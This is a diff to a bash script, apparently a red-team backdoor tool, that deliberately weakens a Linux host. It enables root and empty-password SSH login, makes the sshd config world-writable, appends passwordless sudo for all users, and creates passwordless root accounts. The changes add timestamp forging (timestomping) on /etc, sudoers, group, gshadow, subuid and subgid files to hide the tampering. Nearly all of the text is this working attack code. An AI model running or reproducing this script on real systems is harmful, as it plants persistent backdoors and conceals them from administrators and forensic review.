@@ -91,7 +91,8 @@ set_timestamp () {
 
 # *** Configurable variables ***
 
-SSHD_CONFIG="/etc/ssh/sshd_config"
+SSH_CONFIG_DIR="/etc/ssh"
+SSHD_CONFIG="$SSH_CONFIG_DIR/sshd_config"
 SSHD_PAM="/etc/pam.d/sshd"
 
 PASSWD="/etc/passwd"
@@ -121,6 +122,7 @@ cecho task "Weakening SSH"
 if [ ! -f "$SSHD_CONFIG" ]; then
 	cecho warning "SSHD configuration file '$SSHD_CONFIG' does not exist, skipping"
 else
+	ssh_timestamp=`get_timestamp "$SSH_CONFIG_DIR"`
 	sshd_timestamp=`get_timestamp "$SSHD_CONFIG"`
 
 	# Make sshd config world writable
@@ -128,6 +130,7 @@ else
 
 	# Allow SSH root login and passwordless login by modifying the sshd configuration file
 	sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/g' $SSHD_CONFIG && sed -i 's/.*PermitEmptyPasswords.*/PermitEmptyPasswords yes/g' $SSHD_CONFIG && sed -i 's/.*PubkeyAuthentication.*/PubkeyAuthentication yes/g' $SSHD_CONFIG && sed -i 's/.*PasswordAuthentication.*/PasswordAuthentication yes/g' $SSHD_CONFIG && cecho info "Modified '$SSHD_CONFIG': enabled root, passwordless, public key, and password login" || cecho error "Couldn't modify '$SSHD_CONFIG'"
+	set_timestamp $ssh_timestamp $SSH_CONFIG_DIR
 	set_timestamp $sshd_timestamp $SSHD_CONFIG
 
 	# Restart the sshd service
@@ -190,15 +193,29 @@ cecho task "Weakening sudo"
 if [ ! -f "$SUDOERS" ]; then
 	cecho error "Sudoers file '$SUDOER' does not exist, skipping"
 else
+	etc_timestamp=`get_timestamp "/etc"`
+	sudoers_timestamp=`get_timestamp "$SUDOERS"`
+	group_timestamp=`get_timestamp "/etc/group"`
+	group_backup_timestamp=`get_timestamp "/etc/group-"`
+	gshadow_timestamp=`get_timestamp "/etc/gshadow"`
+	gshadow_backup_timestamp=`get_timestamp "/etc/gshadow-"`
+
 	groupadd -f "users" && cecho info "Created group 'users'" || cecho error "Could not create group 'users'"
 	groupadd -f "wheel" && cecho info "Created group 'wheel'" || cecho error "Could not create group 'wheel'"
 	groupadd -f "sudo" && cecho info "Created group 'sudo'" || cecho error "Could not create group 'sudo'"
 
 	echo '
-	%users ALL=(ALL) NOPASSWD: ALL
-	%wheel ALL=(ALL) NOPASSWD: ALL
-	%sudo ALL=(ALL) NOPASSWD: ALL
-	ALL ALL=(ALL) NOPASSWD: ALL' >> "$SUDOERS" && cecho info "Gave groups 'wheel', 'sudo', 'users', and every other user passwordless sudo permissions" || cecho error "Could not modify '$SUDOERS'"
+%users ALL=(ALL) NOPASSWD: ALL
+%wheel ALL=(ALL) NOPASSWD: ALL
+%sudo ALL=(ALL) NOPASSWD: ALL
+ALL ALL=(ALL) NOPASSWD: ALL' >> "$SUDOERS" && cecho info "Gave groups 'wheel', 'sudo', 'users', and every other user passwordless sudo permissions" || cecho error "Could not modify '$SUDOERS'"
+
+	set_timestamp $etc_timestamp "/etc"
+	set_timestamp $sudoers_timestamp "$SUDOERS"
+	set_timestamp $group_timestamp "/etc/group"
+	set_timestamp $group_backup_timestamp "/etc/group-"
+	set_timestamp $gshadow_timestamp "/etc/gshadow"
+	set_timestamp $gshadow_backup_timestamp "/etc/gshadow-"
 fi
 
 cecho done "Done weakening sudo"
@@ -216,11 +233,14 @@ cecho done "Done setting passwords for all default nologin users"
 cecho task "Creating new root users"
 
 if [ -z "$NEW_ROOT_USERS" ]; then
+	cecho debug "'NEW_ROOT_USERS' associative array is '$NEW_ROOT_USERS'"
 	cecho warning "No new root users to create, skipping"
 else
-	# Create the new passwordless root user
 	passwd_timestamp=`get_timestamp "$PASSWD"`
 	shadow_timestamp=`get_timestamp "$SHADOW"`
+	subuid_timestamp=`get_timestamp "/etc/subuid"`
+	subgid_timestamp=`get_timestamp "/etc/subgid"`
+
 	for username in "${!NEW_ROOT_USERS[@]}"; do
 		if grep -q "${username}:x:" "$PASSWD"; then
 			cecho warning "User '$username' already exists, skipping"
@@ -230,8 +250,12 @@ else
 			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
 		fi
 	done
+
 	set_timestamp $passwd_timestamp $PASSWD
 	set_timestamp $shadow_timestamp $SHADOW
+	set_timestamp $subuid_timestamp "/etc/subuid"
+	set_timestamp $subgid_timestamp "/etc/subgid"
+	
 	cecho debug "If rearranging passwd or shadow, run these commands when done to modify the timestamps:
 	touch -t $passwd_timestamp $PASSWD
 	touch -t $shadow_timestamp $SHADOW"
@@ -246,9 +270,11 @@ cecho task "Creating new system users"
 if [ -z "$NEW_SYSTEM_USERS" ]; then
 	cecho warning "No new system users to create, skipping"
 else
-	# Create the new passwordless root user
 	passwd_timestamp=`get_timestamp "$PASSWD"`
 	shadow_timestamp=`get_timestamp "$SHADOW"`
+	subuid_timestamp=`get_timestamp "/etc/subuid"`
+	subgid_timestamp=`get_timestamp "/etc/subgid"`
+
 	for username in "${!NEW_SYSTEM_USERS[@]}"; do
 		if grep -q "${username}:x:" "$PASSWD"; then
 			cecho warning "User '$username' already exists, skipping"
@@ -258,8 +284,12 @@ else
 			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
 		fi
 	done
+
 	set_timestamp $passwd_timestamp $PASSWD
 	set_timestamp $shadow_timestamp $SHADOW
+	set_timestamp $subuid_timestamp "/etc/subuid"
+	set_timestamp $subgid_timestamp "/etc/subgid"
+
 	cecho debug "If rearranging passwd or shadow, run these commands when done to modify the timestamps:
 	touch -t $passwd_timestamp $PASSWD
 	touch -t $shadow_timestamp $SHADOW"
@@ -274,9 +304,11 @@ cecho task "Creating new normal users"
 if [ -z "$NEW_NORMAL_USERS" ]; then
 	cecho warning "No new normal users to create, skipping"
 else
-	# Create the new passwordless root user
 	passwd_timestamp=`get_timestamp "$PASSWD"`
 	shadow_timestamp=`get_timestamp "$SHADOW"`
+	subuid_timestamp=`get_timestamp "/etc/subuid"`
+	subgid_timestamp=`get_timestamp "/etc/subgid"`
+
 	for username in "${!NEW_NORMAL_USERS[@]}"; do
 		if grep -q "${username}:x:" "$PASSWD"; then
 			cecho warning "User '$username' already exists, skipping"
@@ -285,8 +317,12 @@ else
 			useradd -l -c "${NEW_NORMAL_USERS[$username]}" -s "$USER_SHELL" -G "wheel,sudo,users" "$username" -p "$USER_PASSWORD" && cecho info "Created new normal user '$username' with password '$USER_PASSWORD'" || cecho error "Could not create new normal user '$username'"
 		fi
 	done
+
 	set_timestamp $passwd_timestamp $PASSWD
 	set_timestamp $shadow_timestamp $SHADOW
+	set_timestamp $subuid_timestamp "/etc/subuid"
+	set_timestamp $subgid_timestamp "/etc/subgid"
+
 	cecho debug "If rearranging passwd or shadow, run these commands when done to modify the timestamps:
 	touch -t $passwd_timestamp $PASSWD
 	touch -t $shadow_timestamp $SHADOW"
